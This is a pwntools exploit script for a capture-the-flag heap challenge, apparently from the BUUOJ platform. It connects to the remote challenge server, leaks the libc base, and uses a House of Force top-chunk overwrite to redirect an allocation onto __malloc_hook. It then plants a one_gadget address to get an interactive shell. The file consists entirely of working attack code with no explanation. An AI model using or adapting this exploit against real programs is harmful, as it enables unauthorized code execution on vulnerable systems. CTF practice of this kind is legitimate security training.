from pwn import *
context.log_level = 'debug'

#p = process("./pwn1")
p = remote("node3.buuoj.cn", 25014)
elf = ELF("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def dbg():
	gdb.attach(p)
	p.interactive()
def add(size, content):
	p.sendline("1")
	p.sendlineafter("size\n", str(size))
	p.sendafter("content\n", content)
def exp():
	p.sendline("1")
	p.sendlineafter("size\n", str(0x200000))
	p.recvuntil("0x")
	libc.address = int(p.recv(12), 16)-0x7f9bdf4f5010+0x7f9bdf6f6000
	p.sendafter("content\n", 'aa')
	
	log.info("libc.address == >" + hex(libc.address))
	log.info("__malloc_hook == >" + hex(libc.sym['__malloc_hook']))

	p.sendline("1")
	p.sendlineafter("size\n", str(0x18))
	p.recvuntil("0x")
	heap = int(p.recv(12), 16)	
	p.sendafter("content\n", 'a'*0x18+'\xff'*8)

	
	log.info("heap="+hex(heap))
	offset = libc.sym['__malloc_hook'] -heap- 0x40
	log.info("offset = " + str(offset))	
	add(offset, 'a')
	add(0x18, '\x00'*8+p64(libc.address+0x4526a)+p64(libc.sym['__libc_realloc']+4))
	p.recvuntil("puts\n")
	p.sendline(str(1))
	p.recvuntil("size\n")
	# pause()
	p.sendline(str(0))
	p.interactive()
	
if __name__ == '__main__':
	exp()